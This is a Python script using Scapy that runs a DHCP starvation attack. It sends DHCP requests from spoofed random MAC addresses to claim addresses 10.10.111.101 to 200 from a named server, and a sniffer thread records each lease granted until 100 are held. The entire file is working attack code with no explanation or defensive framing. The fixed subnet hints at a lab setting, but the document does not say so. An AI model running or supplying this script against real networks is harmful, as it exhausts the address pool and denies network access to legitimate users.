from scapy.all import *
from time import sleep
from threading import Thread

class DHCPStarvation(object):
    def __init__(self):
        self.mac=[""]
        self.IP=[]

    def handle_dhcp(self, pkt):
        #print "handle:start"
        if pkt[DHCP]:
            #print "DHCP"
            if pkt[BOOTP].yiaddr=="0.0.0.0":
                print "NO reply:01"
            elif "10.10.111." in pkt[BOOTP].yiaddr:
                self.IP.append(pkt[BOOTP].yiaddr)
                print str(pkt[BOOTP].yiaddr)+" OK"

            else :
                print "NO reply:02"
        #print "handle:done"

    def listen(self):
        #print "listen:start listen"
        sniff(filter="udp and (port 67 or port 68)",
                prn=self.handle_dhcp,
                store=0)
        #print "listen:end listen"

    def start(self):
        thread = Thread(target=self.listen)
        thread.start()


        while len(self.IP)<100: self.send()
        #print "done"



    def send(self):
        for i in range(1,101):
            rq_addr = "10.10.111."+str(100+i)
            if rq_addr in self.IP:
                continue

            src_mac=""
            while src_mac in self.mac:
                src_mac = RandMAC()
            self.mac.append(src_mac)

            pkt=Ether(src=src_mac, dst="ff:ff:ff:ff:ff:ff")
            pkt/=IP(src="0.0.0.0",dst="255.255.255.255")
            pkt/=UDP(sport=68,dport=67)
            pkt/= BOOTP(chaddr=RandString(12,"0123456789abcdef"))
            pkt/=DHCP(options=[("message-type", "request"),("requested_addr", rq_addr),("server_id","10.10.111.1"),"end"])
            sendp(pkt)
            print "ocuppying "+rq_addr
            sleep(1.0)

if __name__ == "__main__":
    st = DHCPStarvation()
    st.start()

